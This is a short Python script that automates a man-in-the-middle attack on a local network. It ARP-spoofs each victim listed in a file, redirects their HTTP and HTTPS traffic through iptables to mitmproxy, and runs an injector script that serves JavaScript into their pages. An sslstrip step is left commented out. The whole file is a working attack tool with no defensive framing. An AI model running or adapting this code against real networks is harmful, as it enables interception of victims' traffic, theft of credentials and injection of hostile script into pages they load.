import os
import sys

#get gateway_ip (router)
gateway = sys.argv[1]
local = sys.argv[2]
interface = sys.argv[3]
print("gateway: " + gateway)
# get victims_ip
victims = [line.rstrip('\n') for line in open("victims.txt")]
victims.remove(gateway)
victims.remove(local)
print("victims:")
print(victims)


# configure routing (IPTABLES)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o "+interface+" -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")


# run the arpspoof for each victim, each one in a new console
for victim in victims:
    os.system("xterm -e arpspoof -i "+interface+" -t " + victim + " " + gateway + " &")
    os.system("xterm -e arpspoof -i "+interface+" -t " + gateway + " " + victim + " &")

# start the http server for serving the script.js, in a new console
os.system("xterm -hold -e 'python3 httpServer.py' &")

# start the mitmproxy
os.system("mitmdump -s ssl_injector.py --mode transparent --anticache")



# run sslstrip
#os.system("xterm -e sslstrip -l 8080 &")

